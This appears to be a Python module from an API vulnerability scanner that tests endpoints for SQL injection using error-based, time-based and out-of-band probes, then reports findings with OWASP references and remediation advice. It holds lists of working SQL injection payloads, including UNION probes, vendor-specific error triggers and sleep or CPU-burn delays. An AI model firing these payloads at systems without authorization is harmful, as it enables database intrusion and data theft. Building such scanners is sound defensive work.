from __future__ import annotations

import logging
import time
from typing import Any, Dict, List, Optional

from app.scanners.api_scanner.engine.oob_server import OOBTracker
from app.scanners.api_scanner.engine.oob_tokens import sqli_oob_payloads
from app.scanners.api_scanner.engine.payload_encoder import encode_for_context
from app.scanners.api_scanner.engine.request_executor import execute_request
from app.scanners.api_scanner.tests import build_url, make_finding

logger = logging.getLogger(__name__)

OWASP = "Injection"
REF = "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
CVSS_VEC = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"

# Error-based detection keywords (covers MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
SQL_ERROR_PATTERNS = [
    "sql syntax", "mysql", "mariadb", "sqlite", "postgresql", "pg::",
    "ora-", "mssql", "sqlstate", "unclosed quotation", "syntax error",
    "you have an error in your sql", "warning: mysql", "quoted string not properly terminated",
    "microsoft ole db", "odbc", "jdbc", "sql server",
    "unterminated string", "invalid input syntax", "near \"syntax\"",
    "sqlexception", "hibernate", "org.postgresql", "com.mysql",
    "division by zero", "invalid column", "operand type clash",
    "subquery returns more than", "conversion failed",
]

# Error-based payloads — covers multiple DB vendors and injection contexts
ERROR_PAYLOADS = [
    # Basic string terminators
    "'",
    "\"",
    "\\",
    "' --",
    "\" --",
    # Classic boolean-based
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    # UNION-based probes
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' UNION ALL SELECT 1,2,3--",
    # ORDER BY enumeration
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    # Stacked queries
    "'; SELECT 1--",
    "'; SELECT pg_sleep(0)--",
    # Integer context
    "1 OR 1=1",
    "1) OR (1=1",
    "-1 OR 1=1",
    # Vendor-specific error triggers
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",  # MySQL
    "1' AND CAST(VERSION() AS INT)--",  # PostgreSQL
    "1' AND 1=CONVERT(INT,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES))--",  # MSSQL
    # JSON/NoSQL boundary crossing
    "{'$gt': ''}",
    # Comment variations
    "' /*",
    "' #",
    # Encoded variants
    "%27%20OR%20%271%27%3D%271",
]

# Time-based payloads (3-second delay, covers MySQL, MSSQL, PostgreSQL, SQLite, Oracle)
TIME_PAYLOADS = [
    "' OR SLEEP(3)--",
    "' AND SLEEP(3)--",
    "1' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR pg_sleep(3)--",
    "' AND 1=(SELECT 1 FROM PG_SLEEP(3))--",
    "1 OR SLEEP(3)",
    "' AND RANDOMBLOB(300000000)--",  # SQLite CPU burn
    "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",  # Oracle
]

TIME_THRESHOLD = 2.5  # seconds — flag if response takes >2.5s longer than baseline


async def run_sqli_tests(
    endpoint: Dict[str, Any],
    base_url: str,
    auth_headers: Dict[str, str],
    query_params: Dict[str, str],
    oob_tracker: Optional[OOBTracker] = None,
) -> List[Dict[str, Any]]:
    """Run SQL injection checks on endpoint parameters and body fields."""
    findings: List[Dict[str, Any]] = []
    method = endpoint.get("method", "GET")
    path = endpoint.get("path", "")
    ep_label = f"{method} {path}"
    url = build_url(base_url, path, query_params)
    merged_headers = {**auth_headers, "Content-Type": "application/json"}

    # Get baseline response + timing
    baseline_start = time.time()
    baseline_resp, _ = await execute_request(method, url, headers=merged_headers,
                                              body=endpoint.get("body") if method in ("POST", "PUT", "PATCH") else None)
    baseline_time = time.time() - baseline_start
    baseline_status = baseline_resp.status_code if baseline_resp else 0

    # ── 1. Error-based SQL injection ──────────────────────────────────

    # Test query parameters
    params = [p for p in endpoint.get("parameters", []) if p.get("in") == "query"]
    for param in params:
        param_name = param.get("name", "")
        for payload in ERROR_PAYLOADS:
            for encoded_payload, enc_desc in encode_for_context(payload, "query", max_variants=3):
                test_params = {**query_params, param_name: encoded_payload}
                test_url = build_url(base_url, path, test_params)
                resp, evidence = await execute_request(method, test_url, headers=merged_headers)
                if resp is None:
                    continue
                body_lower = (resp.text or "").lower()
                if any(p in body_lower for p in SQL_ERROR_PATTERNS):
                    findings.append(make_finding(
                        owasp_category=OWASP,
                        title=f"SQL Injection (Error-based) — param: {param_name}",
                        cvss_vector=CVSS_VEC,
                        endpoint=ep_label,
                        description=f"SQL error detected when injecting '{payload}' ({enc_desc}) into query parameter '{param_name}'. The error message reveals database details.",
                        evidence=evidence,
                        impact="Full database compromise. Attacker can read, modify, or delete data. Potential remote code execution via SQL features.",
                        remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                        references=[REF],
                    ))
                    return findings  # Critical — one proof is enough

    # Test body fields
    if method in ("POST", "PUT", "PATCH"):
        body_fields = list((endpoint.get("body") or {}).keys())
        for field in body_fields:
            for payload in ERROR_PAYLOADS:
                for encoded_payload, enc_desc in encode_for_context(payload, "body", max_variants=3):
                    test_body = dict(endpoint.get("body") or {})
                    test_body[field] = encoded_payload
                    resp, evidence = await execute_request(method, url, headers=merged_headers, body=test_body)
                    if resp is None:
                        continue
                    body_lower = (resp.text or "").lower()
                    if any(p in body_lower for p in SQL_ERROR_PATTERNS):
                        findings.append(make_finding(
                            owasp_category=OWASP,
                            title=f"SQL Injection (Error-based) — field: {field}",
                            cvss_vector=CVSS_VEC,
                            endpoint=ep_label,
                            description=f"SQL error detected when injecting '{payload}' ({enc_desc}) into body field '{field}'.",
                            evidence=evidence,
                            impact="Full database compromise. Attacker can extract all data, modify records, or execute system commands.",
                            remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                            references=[REF],
                        ))
                        return findings

    # ── 2. Time-based SQL injection ───────────────────────────────────
    for payload in TIME_PAYLOADS:
        # Test on first query param or first body field
        if params:
            param_name = params[0].get("name", "test")
            test_params = {**query_params, param_name: payload}
            test_url = build_url(base_url, path, test_params)
            start = time.time()
            resp, evidence = await execute_request(method, test_url, headers=merged_headers, timeout=15)
            elapsed = time.time() - start
        elif method in ("POST", "PUT", "PATCH") and (endpoint.get("body") or {}):
            field = list(endpoint["body"].keys())[0]
            test_body = dict(endpoint["body"])
            test_body[field] = payload
            start = time.time()
            resp, evidence = await execute_request(method, url, headers=merged_headers, body=test_body, timeout=15)
            elapsed = time.time() - start
        else:
            break

        if elapsed - baseline_time > TIME_THRESHOLD:
            findings.append(make_finding(
                owasp_category=OWASP,
                title="SQL Injection (Time-based Blind)",
                cvss_vector=CVSS_VEC,
                endpoint=ep_label,
                description=f"Time-based SQL injection detected. Payload '{payload}' caused a {elapsed:.1f}s response (baseline: {baseline_time:.1f}s).",
                evidence=evidence,
                impact="Blind SQL injection confirmed. Attacker can extract data one bit at a time using timing side-channels.",
                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                confidence="MEDIUM",
                references=[REF],
            ))
            return findings

    # ── OOB SQL Injection probes ─────────────────────────────────────
    if oob_tracker and oob_tracker.enabled:
        # Use the first available query param or body field as injection target
        oob_target_name: Optional[str] = None
        oob_target_loc: Optional[str] = None
        if params:
            oob_target_name = params[0].get("name", "")
            oob_target_loc = "query"
        elif method in ("POST", "PUT", "PATCH") and (endpoint.get("body") or {}):
            oob_target_name = list(endpoint["body"].keys())[0]
            oob_target_loc = "body"

        if oob_target_name:
            callback_url = oob_tracker.generate_payload_url(
                "sqli", ep_label, f"SQLi OOB via {oob_target_name}"
            )
            oob_payloads = sqli_oob_payloads(callback_url)
            for payload, desc in oob_payloads:
                if oob_target_loc == "query":
                    test_params = {**query_params, oob_target_name: payload}
                    test_url = build_url(base_url, path, test_params)
                    await execute_request(method, test_url, headers=merged_headers)
                else:
                    test_body = dict(endpoint.get("body") or {})
                    test_body[oob_target_name] = payload
                    await execute_request(method, url, headers=merged_headers, body=test_body)
                logger.debug("OOB SQLi probe sent: %s — %s", oob_target_name, desc)

    return findings
